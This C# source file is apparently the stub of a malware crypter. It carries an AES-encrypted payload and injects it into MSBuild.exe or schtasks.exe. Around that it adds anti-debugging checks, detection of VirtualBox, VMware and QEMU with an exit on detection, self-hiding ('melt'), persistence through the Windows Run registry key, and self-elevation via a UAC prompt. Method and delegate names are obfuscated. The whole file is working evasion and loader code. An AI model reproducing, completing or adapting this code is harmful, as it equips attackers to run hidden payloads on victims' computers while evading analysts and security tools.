using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;

namespace Stub
{
    internal static class Program
    {

        #region DLLImports

        [DllImport("kernel32.dll")]
        internal static extern int CloseHandle(IntPtr intptr_0);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr OpenProcess(uint uint_0, int int_0, uint uint_1);

        [DllImport("kernel32.dll")]
        internal static extern uint GetCurrentProcessId();

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr LoadLibrary(string string_0);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        internal static extern Program.gOHZZlvDlpZktBCBlFdUshhCXucbZveGnXmLQPRWHZdLWUtawGllSYkHebBQxSWCiUGkf GetProcAddress(IntPtr intptr_0, string string_0);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
        internal static extern Program.SkgsDYdIISoHZOPUqGBLNBBJufgNrEBAAXvQhcYSbhURkKvWrRAfuaTFYMSfzgrNccFujittkmeIPBdMlYmDBuVvOSqEzirF GetProcAddress_1(IntPtr intptr_0, string string_0);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
        internal static extern Program.HUFpWpnusirrSRWznHvNMAVSvGUmnZFqBFYEdOeJFNwRLNyXds GetProcAddress_3(IntPtr intptr_0, string string_0);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
        public static extern IntPtr GetProcAddress_4(IntPtr intptr_0, string string_0);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr GetModuleHandle(string string_0);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern IntPtr FindWindow(string string_0, IntPtr intptr_0);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern uint GetFileAttributes(string string_0);

        #endregion

        #region Delegates

        internal delegate int gOHZZlvDlpZktBCBlFdUshhCXucbZveGnXmLQPRWHZdLWUtawGllSYkHebBQxSWCiUGkf();

        internal delegate int SkgsDYdIISoHZOPUqGBLNBBJufgNrEBAAXvQhcYSbhURkKvWrRAfuaTFYMSfzgrNccFujittkmeIPBdMlYmDBuVvOSqEzirF(IntPtr intptr_0, ref int int_0);

        internal delegate int QgoFllrGgjToSvLNNxZSookhmlSRKZeqtfdPcNjOObUhHyUNjBJRcYdOjnmCliiiDRIRjhZRpRJXVxkeZTjLvHxdGI(IntPtr intptr_0, IntPtr intptr_1);

        internal delegate int HUFpWpnusirrSRWznHvNMAVSvGUmnZFqBFYEdOeJFNwRLNyXds(Program.QgoFllrGgjToSvLNNxZSookhmlSRKZeqtfdPcNjOObUhHyUNjBJRcYdOjnmCliiiDRIRjhZRpRJXVxkeZTjLvHxdGI qgoFllrGgjToSvLNNxZSookhmlSRKZeqtfdPcNjOObUhHyUNjBJRcYdOjnmCliiiDRIRjhZRpRJXVxkeZTjLvHxdGI_0, IntPtr intptr_0);

        #endregion

        #region FeaturesValues

        private static int antivm;
        private static int melt;
        private static int startup;
        private static int adminrights;
        private static int antidebug;
        private static long net;
        private static byte[] key;
        private static byte[] iv;
        private static byte[] payload;

        #endregion

        static Program()
        {
            antivm = 0;
            melt = 0;
            startup = 0;
            adminrights = 0;
            antidebug = 0;
            net = 0;
            key = new byte[] {  };
            iv = new byte[] {  };
            payload = new byte[] {  };
        }
        static void Main(string[] args)
        {
            if (antidebug == 1)
            {
                AntiDebug();
            }
            if (antivm == 1)
            {
                AntiVM();
            }
            if (adminrights == 1)
            {
                RunAsAdmin();
            }
            if (melt == 1)
            {
                Melting();
            }
            if (startup == 1)
            {
                StartUp();
            }

            var pathnet = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe";
            var pathnative = @"C:\Windows\System32\schtasks.exe";
            if (net == 1)
            {
                Injection.Execute(pathnet, DecryptData(payload));
            }
            else
            {
                Injection.Execute(pathnative, DecryptData(payload));
            }
        }

        #region Decrypt

        public static byte[] DecryptData(byte[] encr)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(encr, 0, encr.Length);
                    }

                    return memoryStream.ToArray();
                }
            }
        }

        #endregion

        #region FeaturesExecution
        private static void StartUp()
        {
            try
            {
                Assembly assembly = Assembly.GetExecutingAssembly();

                string exeName = assembly.GetName().Name;

                string sourcePath = Assembly.GetExecutingAssembly().Location;

                string targetDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), exeName);
                Directory.CreateDirectory(targetDirectory);

                string targetPath = Path.Combine(targetDirectory, Path.GetFileName(sourcePath));

                File.Copy(sourcePath, targetPath, true);

                if (melt == 1)
                {
                    FileAttributes attributes = File.GetAttributes(targetDirectory);

                    attributes |= FileAttributes.Hidden | FileAttributes.System;

                    File.SetAttributes(targetDirectory, attributes);
                }

                string exePath = targetDirectory;

                string registryKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryKey, true))
                {
                    key.SetValue(exeName, exePath);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Fatal Error: {ex.Message}");
            }
        }

        private static void Melting()
        {
            string exePath = Assembly.GetExecutingAssembly().Location;

            FileAttributes attributes = File.GetAttributes(exePath);

            attributes |= FileAttributes.Hidden | FileAttributes.System;

            File.SetAttributes(exePath, attributes);
        }

        private static void AntiDebug()
        {
            Program.hVvIzNRCVUDMwtSzaLbumjDmBwVPuVJkuXKcqfiBJthgmfyLwjirSgsBPhmUzqaveI();
        }

        private static void AntiVM()
        {
            Program.PjDgzCLZVafcILNtUSclLmuWgvBnL();
        }

        private static void RunAsAdmin()
        {
            if (!IsRunAsAdmin())
            {
                RestartAsAdmin();
                return;
            }
        }

        #endregion

        #region AntiDebugMethods

        //Thank you very much, lnx xD
        public static bool hVvIzNRCVUDMwtSzaLbumjDmBwVPuVJkuXKcqfiBJthgmfyLwjirSgsBPhmUzqaveI()
        {
            try
            {
                byte[] array = new byte[1];
                Type typeFromHandle = typeof(Debugger);
                typeFromHandle.GetMethods();
                MethodInfo method = typeFromHandle.GetMethod("get_IsAttached");
                IntPtr functionPointer = method.MethodHandle.GetFunctionPointer();
                Marshal.Copy(functionPointer, array, 0, 1);
                if (array[0] == 51)
                {
                    return true;
                }
                IntPtr intPtr = Program.LoadLibrary("kernel32.dll");
                if (Debugger.IsAttached)
                {
                    return true;
                }
                Program.gOHZZlvDlpZktBCBlFdUshhCXucbZveGnXmLQPRWHZdLWUtawGllSYkHebBQxSWCiUGkf procAddress = Program.GetProcAddress(intPtr, "IsDebuggerPresent");
                if (procAddress != null && procAddress() != 0)
                {
                    return true;
                }
                IntPtr intPtr2 = Program.OpenProcess(1024U, 0, Program.GetCurrentProcessId());
                if (intPtr2 != IntPtr.Zero)
                {
                    try
                    {
                        Program.SkgsDYdIISoHZOPUqGBLNBBJufgNrEBAAXvQhcYSbhURkKvWrRAfuaTFYMSfzgrNccFujittkmeIPBdMlYmDBuVvOSqEzirF procAddress_ = Program.GetProcAddress_1(intPtr, "CheckRemoteDebuggerPresent");
                        if (procAddress_ != null)
                        {
                            int num = 0;
                            if (procAddress_(intPtr2, ref num) != 0 && num != 0)
                            {
                                return true;
                            }
                        }
                    }
                    finally
                    {
                        Program.CloseHandle(intPtr2);
                    }
                }
                bool flag = false;
                try
                {
                    Program.CloseHandle(new IntPtr(305419896));
                }
                catch
                {
                    flag = true;
                }
                if (flag)
                {
                    return true;
                }
            }
            catch
            {
            }
            return false;
        }

        public static void rtTOfVyfRLxqpdVRoVgROePRtukCRKdAAHlDfzvgJuicqyqjEpPodRsbHnHqdQxRpVLUQlBwcGCvBYsQviYS()
        {
            if (Program.hVvIzNRCVUDMwtSzaLbumjDmBwVPuVJkuXKcqfiBJthgmfyLwjirSgsBPhmUzqaveI())
            {
                Environment.Exit(0);
            }
        }

        #endregion

        #region AntiVMMethods

        internal static void PjDgzCLZVafcILNtUSclLmuWgvBnL()
        {
            if (Program.OtIGiMuPwcezhtaLjwMltnkjCIbRXcFZHnNOlMHtJNPnGkSisWNVwzvUTLMCpmChVRsAQeH())
            {
                Environment.Exit(0);
            }
        }
        internal static bool OtIGiMuPwcezhtaLjwMltnkjCIbRXcFZHnNOlMHtJNPnGkSisWNVwzvUTLMCpmChVRsAQeH()
        {
            try
            {
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VBOX"))
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VBOX"))
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("HARDWARE\\Description\\System", "VideoBiosVersion").ToUpper().Contains("VIRTUALBOX"))
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("SOFTWARE\\Oracle\\VirtualBox Guest Additions", "") == "noValueButYesKey")
                {
                    return true;
                }
                if (Program.GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys") != 4294967295U)
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE"))
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("SOFTWARE\\VMware, Inc.\\VMware Tools", "") == "noValueButYesKey")
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE"))
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE"))
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0").ToUpper().Contains("vmware".ToUpper()))
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", "DriverDesc").ToUpper().Contains("VMWARE"))
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings", "Device Description").ToUpper().Contains("VMWARE"))
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath").ToUpper().Contains("C:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\"))
                {
                    return true;
                }
                if (Program.GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys") != 4294967295U)
                {
                    return true;
                }
                if (Program.GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys") != 4294967295U)
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("QEMU"))
                {
                    return true;
                }
                if (Program.UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("QEMU"))
                {
                    return true;
                }
                ManagementScope managementScope = new ManagementScope("\\\\.\\ROOT\\cimv2");
                ObjectQuery objectQuery = new ObjectQuery("SELECT * FROM Win32_VideoController");
                foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(managementScope, objectQuery).Get())
                {
                    ManagementObject managementObject = (ManagementObject)managementBaseObject;
                    if (managementObject["Description"].ToString() == "VM Additions S3 Trio32/64")
                    {
                        return true;
                    }
                    if (managementObject["Description"].ToString() == "S3 Trio32/64")
                    {
                        return true;
                    }
                    if (managementObject["Description"].ToString() == "VirtualBox Graphics Adapter")
                    {
                        return true;
                    }
                    if (managementObject["Description"].ToString() == "VMware SVGA II")
                    {
                        return true;
                    }
                    if (managementObject["Description"].ToString().ToUpper().Contains("VMWARE"))
                    {
                        return true;
                    }
                    if (managementObject["Description"].ToString() == "")
                    {
                        return true;
                    }
                }
            }
            catch
            {
            }
            return false;
        }
        internal static string UleZGQKoKOUyNOmzkeKJAXMAXLGPOQe(string string_0, string string_1)
        {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, false);
            string text;
            if (registryKey == null)
            {
                text = "noKey";
            }
            else
            {
                object value = registryKey.GetValue(string_1, "noValueButYesKey");
                if (value.GetType() == typeof(string))
                {
                    text = value.ToString();
                }
                else if (registryKey.GetValueKind(string_1) == RegistryValueKind.String || registryKey.GetValueKind(string_1) == RegistryValueKind.ExpandString)
                {
                    text = value.ToString();
                }
                else if (registryKey.GetValueKind(string_1) == RegistryValueKind.DWord)
                {
                    text = Convert.ToString((int)value);
                }
                else if (registryKey.GetValueKind(string_1) == RegistryValueKind.QWord)
                {
                    text = Convert.ToString((long)value);
                }
                else if (registryKey.GetValueKind(string_1) == RegistryValueKind.Binary)
                {
                    text = Convert.ToString((byte[])value);
                }
                else if (registryKey.GetValueKind(string_1) == RegistryValueKind.MultiString)
                {
                    text = string.Join("", (string[])value);
                }
                else
                {
                    text = "noValueButYesKey";
                }
            }
            return text;
        }

        #endregion

        #region AdminRightsMethods

        static bool IsRunAsAdmin()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void RestartAsAdmin()
        {
            var processInfo = new ProcessStartInfo
            {
                FileName = Environment.GetCommandLineArgs()[0],
                UseShellExecute = true,
                Verb = "runas"
            };

            try
            {
                Process.Start(processInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Ошибка при запуске с правами администратора: " + ex.Message);
            }
            Environment.Exit(0);
        }

        #endregion
    }
}
